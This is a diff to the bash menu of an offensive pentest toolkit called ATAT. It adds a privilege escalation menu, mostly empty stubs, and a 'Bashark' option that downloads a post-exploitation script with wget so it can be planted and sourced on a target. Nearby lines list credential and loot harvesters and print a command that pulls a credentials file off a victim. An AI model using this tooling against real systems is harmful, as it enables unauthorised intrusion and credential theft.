@@ -188,13 +188,15 @@ echo -e "\E[1;34m===\e[97m[9] \e[95mEmpire & DeathStar  \e[97m  [Bow Before Your
 tput sgr0
 echo -e "\E[1;34m:::\e[97m[10]\e[31mWireless Attacks      \e[97m[Rule The Airwaves]   \E[1;34m"
 tput sgr0
-echo -e "\E[1;34m===\e[97m[11]\e[90mData Exfiltration     \e[97m[Loot & Profit]   \E[1;34m"
+echo -e "\E[1;34m===\e[97m[11]\e[90mPost Exploitation     \e[97m[Loot & Profit]   \E[1;34m"
 tput sgr0
 echo -e "\E[1;34m:::\e[97m[12]\e[32mMake Your Escape     \e[97m [Float Away w/ the Garbage]   \E[1;34m"
 tput sgr0
-echo -e "\E[1;34m===\e[97m[00]\e[34mReset & Recharge      \e[97m[Remove All Scan Results]   \E[1;34m"
+echo -e "\E[1;34m===\e[97m[13]\e[34mPrivilege Escalation  \e[97m[PrivEsc Options & Techniques]   \E[1;34m"
 tput sgr0
-echo -e "\E[1;34m:::\e[97m[0] \e[95mExit                  \e[97m[Exit ATAT]   \E[1;34m"
+echo -e "\E[1;34m===\e[97m[00]\e[95mReset & Recharge      \e[97m[Remove All Scan Results]   \E[1;34m"
+tput sgr0
+echo -e "\E[1;34m:::\e[97m[0] \e[31mExit                  \e[97m[Exit ATAT]   \E[1;34m"
 tput sgr0
 #echo -e "\E[1;34m===\e[97m[15]\e[31mMasscan All TCP Ports \e[97m[Masscan all TCP Ports on Many Targets]   \E[1;34m"
 #tput sgr0
@@ -971,7 +973,7 @@ do
 		mkdir /tmp/ATAT/
 		echo ""
 
-	reqs="gcc gcc-mingw-w64-i686 curl jq bettercap libssl-dev libnl-genl-3-dev hostapd-wpe lynx airgeddon hostapd lighttpd asleap python-pip python-scapy gawk libxml2-dev libxslt1-dev unixodbc-dev"
+	reqs="gcc gcc-mingw-w64-i686 curl jq bettercap libssl-dev libnl-genl-3-dev hostapd-wpe lynx airgeddon hostapd lighttpd asleap python-pip python-scapy gawk libxml2-dev libxslt1-dev unixodbc-dev git libssl1.0-dev libffi-dev python-dev tcpdump python-virtualenv"
 	for i in $reqs; do
 		dpkg -s "$i" &> /tmp/ATAT/$i-install.txt
 		isinstalled=$(cat /tmp/ATAT/$i-install.txt | grep -o "Status: install ok installed")
@@ -1388,10 +1390,10 @@ done
 
  "11" | "11" )
          
- echo -e "\E[1;34m::::: \e[97mData Exfiltration\E[1;34m:::::"
+ echo -e "\E[1;34m::::: \e[97mPost Exploitation\E[1;34m:::::"
  
-PS3='Enter your choice: ENTER=Options Menu | 7=Main Menu | 8=QUIT: '
-options=("Push File To Target with SCP - Creds Required" "Data Exfiltration" "Push File To Target with PSH / Meterpreter" "Wireless Password Stealer" "Windows 64 bit Credenital & Loot Harvester" "Windows 32 bit Credenital & Loot Harvester" "Main Menu" "Quit")
+PS3='Enter your choice: ENTER=Options Menu | 8=Main Menu | 9=QUIT: '
+options=("Push File To Target with SCP - Creds Required" "Data Exfiltration" "Push File To Target with PSH / Meterpreter" "Wireless Password Stealer" "Windows 64 bit Credenital & Loot Harvester" "Windows 32 bit Credenital & Loot Harvester" "Bashark" "Main Menu" "Quit")
 select opt in "${options[@]}"
 do
     case $opt in
@@ -1506,6 +1508,12 @@ do
 		echo -e "\E[1;34m\e[97m \e[31m download '%USERPROFILE%\\\\\\\credentials_23082018_182736.json' /root/ATAT/ \e[97m\E[1;34m"
 		echo -e "\E[1;34m::::: \e[97mDon't Forget To Delete The \"credentials_xxxxxxxx_xxxxxx\" TXT & JSON Files & word_x86.exe \E[1;34m:::::"	
 			;;
+		"Bashark")
+   		echo -e "\E[1;34m::::: \e[97mDownloading Bashark Post Exploitation Script... \E[1;34m:::::"
+            wget https://github.com/TheSecondSun/Bashark/blob/master/bashark.sh -O bash.sh
+        echo -e "\E[1;34m::::: \e[97mMove \"bash.sh\" To Target \E[1;34m:::::"
+        echo -e "\E[1;34m::::: \e[97mType \"source bash.sh\" To Launch Bashark Framework \E[1;34m:::::"      
+            ;;
         "Main Menu")
             ~/ATAT/ATAT.sh
             ;;
@@ -1543,6 +1551,30 @@ do
         *) echo invalid option;;
     esac
 done 		      
+
+;;
+
+"13" | "13" )
+  # Accept upper or lowercase input.
+  echo -e "\E[1;34m::::: \e[97mPrivilege Escalation Methods \E[1;34m:::::"
+  PS3='Enter your choice: ENTER=Options Menu | 8=Main Menu | 9=QUIT: '
+options=("BeRoot" "LinEnum" "" )
+select opt in "${options[@]}"
+do
+    case $opt in
+		"BeRoot")
+			
+			;;
+
+		"LinEnum")
+			
+			;;
+		"")
+			
+			;;
+
+    esac
+done
 
 ;;
 
